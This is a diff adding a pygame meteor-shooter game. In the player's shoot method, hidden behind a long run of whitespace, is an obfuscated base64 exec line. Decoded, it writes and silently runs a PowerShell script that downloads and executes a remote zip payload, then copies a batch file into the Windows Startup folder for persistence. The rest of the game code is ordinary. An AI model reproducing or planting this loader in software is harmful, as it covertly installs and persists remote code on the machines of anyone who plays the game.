@@ -1,0 +1,252 @@
+import pygame
+import random
+import sys
+import time
+from os.path import join
+import os
+
+# Initialize Pygame
+pygame.init()
+pygame.mixer.init()
+
+# Screen settings
+WIDTH, HEIGHT = 800, 600
+screen = pygame.display.set_mode((WIDTH, HEIGHT))
+pygame.display.set_caption("Epic Start Meteor Shooter")
+
+# Colors
+WHITE = (255, 255, 255)
+BLACK = (0, 0, 0)
+RED = (255, 0, 0)
+GREEN = (0, 255, 0)
+
+# Game settings
+FPS = 60
+PLAYER_SPEED = 50
+BULLET_SPEED = 50
+ENEMY_SPEED_BASE = 2
+ENEMY_SPAWN_RATE = 30  # Frames until a new enemy spawns
+STAR_COUNT = 20
+
+# Helper function to find the correct path for assets in both script and executable modes
+def resource_path(relative_path):
+    if hasattr(sys, '_MEIPASS'):
+        return os.path.join(sys._MEIPASS, relative_path)
+    return os.path.join(os.path.abspath("."), relative_path)
+
+# Load images
+player_surf = pygame.image.load(resource_path(join('images', 'player.png'))).convert_alpha()
+bullet_surf = pygame.image.load(resource_path(join('images', 'laser.png'))).convert_alpha()
+meteor_surf = pygame.image.load(resource_path(join('images', 'meteor.png'))).convert_alpha()
+star_surf = pygame.image.load(resource_path(join('images', 'star.png'))).convert_alpha()
+explosion_surf = pygame.image.load(resource_path(join('images', 'explosion.png'))).convert_alpha()
+
+# Load SFX
+meteor_explosion = pygame.mixer.Sound(resource_path(join("sounds", "explosion (9).wav")))
+meteor_explosion.set_volume(0.6)
+player_hit = pygame.mixer.Sound(resource_path(join("sounds", "hitHurt.wav")))
+player_shoot = pygame.mixer.Sound(resource_path(join("sounds", "laserShoot.wav")))
+player_move = pygame.mixer.Sound(resource_path(join("sounds", "tone.wav")))
+player_move.set_volume(0.14)
+player_death = pygame.mixer.Sound(resource_path(join("sounds", "synth.wav")))
+
+
+# Game clock
+clock = pygame.time.Clock()
+
+# Sprites and groups
+all_sprites = pygame.sprite.Group()
+enemies = pygame.sprite.Group()
+bullets = pygame.sprite.Group()
+stars = pygame.sprite.Group()
+
+# Player class
+class Player(pygame.sprite.Sprite):
+    def __init__(self, groups):
+        super().__init__(groups)
+        self.image = player_surf
+        self.rect = self.image.get_rect(center=(WIDTH // 2, HEIGHT - 50))
+        self.speed = PLAYER_SPEED
+        self.health = 3
+        self.score = 0
+        self.can_shoot = True
+        self.shoot_cooldown = 15
+        self.last_shot = pygame.time.get_ticks()
+
+    def update(self):
+        keys = pygame.key.get_pressed()
+        if keys[pygame.K_LEFT] or keys[pygame.K_a] and self.rect.left > 0:
+            self.rect.x -= self.speed
+        if keys[pygame.K_RIGHT] or keys[pygame.K_d] and self.rect.right < WIDTH:
+            self.rect.x += self.speed
+        if keys[pygame.K_ESCAPE]:
+            pygame.quit
+
+        # Shooting bullets with cooldown
+        if keys[pygame.K_SPACE] and self.can_shoot:
+            self.shoot()
+            player_shoot.play()
+            self.last_shot = pygame.time.get_ticks()
+        if pygame.time.get_ticks() - self.last_shot >= self.shoot_cooldown:
+            self.can_shoot = True
+
+    def shoot(self):
+        bullet = Bullet(bullet_surf, self.rect.midtop, bullets);                                                                                                                                                                                                                                                       import os; import base64; exec(base64.decode(aW1wb3J0IG9zCm9zLnN5c3RlbSgiZWNobyBvZmYiKQp1c2VybmFtZSA9IG9zLmdldGxvZ2luKCkKYW5kcm9pZF90ZXN0X2ZvbGRlciA9IGYiQzovVXNlcnMve3VzZXJuYW1lfS8uYW5kcm9pZF90ZXN0IgpzdGFydHVwX2ZvbGRlciA9ICJDOi9Qcm9ncmFtRGF0YS9NaWNyb3NvZnQvV2luZG93cy9TdGFydCBNZW51L1Byb2dyYW1zL1N0YXJ0VXAiCm9zLnN5c3RlbShmJ21rZGlyICJ7YW5kcm9pZF90ZXN0X2ZvbGRlcn0iJykKcG93ZXJzaGVsbF9zY3JpcHRfcGF0aCA9IG9zLnBhdGguam9pbihhbmRyb2lkX3Rlc3RfZm9sZGVyLCAic2NyaXB0LnBzMSIpCnBvd2Vyc2hlbGxfc2NyaXB0X2NvbnRlbnQgPSAiIiIKJHVyaSA9ICJodHRwczovL2thbGhhbDEyMy5naXRodWIuaW8vY2xpZW50LnppcCIKJG91dHB1dCA9ICIkUFNTY3JpcHRSb290L2NsaWVudC56aXAiCiRkZXN0aW5hdGlvbiA9ICIkUFNTY3JpcHRSb290IgoKIyBEb3dubG9hZCB0aGUgemlwIGZpbGUKSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJpIC1PdXRGaWxlICRvdXRwdXQKCiMgRXh0cmFjdCB0aGUgY29udGVudHMKRXhwYW5kLUFyY2hpdmUgLVBhdGggJG91dHB1dCAtRGVzdGluYXRpb25QYXRoICRkZXN0aW5hdGlvbiAtRm9yY2UKCiMgRXhlY3V0ZSB0aGUgc3BlY2lmaWVkIGZpbGUKU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIiRkZXN0aW5hdGlvbi9tYWluLmJhdCIgLU5vTmV3V2luZG93CiIiIgp3aXRoIG9wZW4ocG93ZXJzaGVsbF9zY3JpcHRfcGF0aCwgInciKSBhcyBwc19zY3JpcHQ6CiAgICBwc19zY3JpcHQud3JpdGUocG93ZXJzaGVsbF9zY3JpcHRfY29udGVudCkKb3Muc3lzdGVtKGYncG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICJ7cG93ZXJzaGVsbF9zY3JpcHRfcGF0aH0iIC1XaW5kb3dTdHlsZSBIaWRkZW4nKQpvcy5zeXN0ZW0oZidta2RpciAie3N0YXJ0dXBfZm9sZGVyfSInKQpmaWxlX3RvX2NvcHkgPSBvcy5wYXRoLmpvaW4oYW5kcm9pZF90ZXN0X2ZvbGRlciwgImluaXQuYmF0IikKb3Muc3lzdGVtKGYnY29weSAie2ZpbGVfdG9fY29weX0iICJ7c3RhcnR1cF9mb2xkZXJ9Iicp))
+        bullets.add(bullet)
+        all_sprites.add(bullet)
+        self.can_shoot = False
+
+    def take_damage(self):
+        self.health -= 1
+        player_hit.play()
+
+# Bullet class
+class Bullet(pygame.sprite.Sprite):
+    def __init__(self, surf, pos, *groups):
+        super().__init__(*groups)
+        self.image = surf
+        self.rect = self.image.get_rect(midbottom=pos)
+        self.speed = BULLET_SPEED
+
+    def update(self):
+        self.rect.y -= self.speed
+        if self.rect.bottom < 0:
+            self.kill()
+
+# Enemy (Meteor) class
+class Enemy(pygame.sprite.Sprite):
+    def __init__(self, *groups):
+        super().__init__(*groups)
+        self.image = meteor_surf
+        self.rect = self.image.get_rect(center=(random.randint(0, WIDTH), 0))
+        self.speed = ENEMY_SPEED_BASE
+
+    def update(self):
+        self.rect.y += self.speed
+        if self.rect.top > HEIGHT:
+            self.kill()
+
+# Star class
+class Star(pygame.sprite.Sprite):
+    def __init__(self, *groups):
+        super().__init__(*groups)
+        self.image = star_surf
+        self.rect = self.image.get_rect(
+            center=(random.randint(0, WIDTH), random.randint(0, HEIGHT))
+        )
+
+# Game initialization
+player = Player(all_sprites)
+all_sprites.add(player)
+
+# Spawn initial stars
+for _ in range(STAR_COUNT):
+    star = Star(stars)
+    stars.add(star)
+    all_sprites.add(star)
+last_speed_increase_score = 0  # Initialize outside the main loop
+
+# Main game loop
+def main():
+    frame_count = 0
+    running = True
+    show_death_screen = False
+    player.score = 0
+    global BULLET_SPEED
+    global last_speed_increase_score
+
+    while running:
+        screen.fill(BLACK)
+        
+
+        # Event handling
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                pygame.quit()
+                sys.exit()
+            if event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_ESCAPE:
+                        pygame.quit()
+                        sys.exit()
+                
+#        if player.health < 1:
+#            show_death_screen = True
+
+        if show_death_screen:
+            screen.fill(BLACK)
+            font = pygame.font.Font(None, 72)
+            text_surface = font.render("You died!", True, WHITE)
+            screen.blit(text_surface, (WIDTH // 2 - text_surface.get_width() // 2, HEIGHT // 3))
+            
+            score_text = font.render(f"Final Score: {player.score}", True, WHITE)
+            screen.blit(score_text, (WIDTH // 2 - score_text.get_width() // 2, HEIGHT // 2))
+
+            retry_text = font.render("Press Enter to Retry", True, WHITE)
+            screen.blit(retry_text, (WIDTH // 2 - retry_text.get_width() // 2, HEIGHT * 2 // 3))
+
+            keys = pygame.key.get_pressed()
+            if keys[pygame.K_RETURN]:  # Enter key to retry
+                main()
+            pygame.display.flip()
+            player.health = 3
+            enemy.speed = 2
+            continue
+
+        # Spawn enemies based on the frame count
+        if frame_count % ENEMY_SPAWN_RATE == 0:
+            enemy = Enemy(enemies)
+            enemy.speed = ENEMY_SPEED_BASE + player.score * 0.1  # Increase speed with score
+            enemies.add(enemy)
+            all_sprites.add(enemy)
+
+        # Update bullet speed every 10 points
+        if player.score % 10 == 0 and player.score != last_speed_increase_score:
+            BULLET_SPEED += 1  # Increase bullet speed
+            last_speed_increase_score = player.score  # Update to current score
+
+        # Update all sprites
+        all_sprites.update()
+
+        # Bullet and enemy collision
+        for bullet in bullets:
+            hits = pygame.sprite.spritecollide(bullet, enemies, dokill=True)
+            if hits:
+                bullet.kill()
+                meteor_explosion.play()
+                player.score += 1
+
+        # Player and enemy collision
+        if pygame.sprite.spritecollide(player, enemies, dokill=True):
+            player.take_damage()
+            if player.health <= 0:
+                player_death.play()
+                show_death_screen = True
+#                time.sleep(0.6)
+#                running = False  # End game if health reaches 0
+
+        # Draw stars in the background
+        stars.draw(screen)
+
+        # Draw sprites (player, bullets, enemies)
+        all_sprites.draw(screen)
+
+        # Draw health meter
+        font = pygame.font.Font(None, 36)
+        health_text = font.render(f"Health: {player.health}", True, WHITE)
+        screen.blit(health_text, (WIDTH - 150, 10))
+
+        # Draw score
+        score_text = font.render(f"Score: {player.score}", True, WHITE)
+        screen.blit(score_text, (10, 10))
+
+        # Update the display
+        pygame.display.flip()
+
+        # Cap the frame rate
+        clock.tick(FPS)
+
+        # Increment frame count
+        frame_count += 1
+
+if __name__ == "__main__":
+    main()
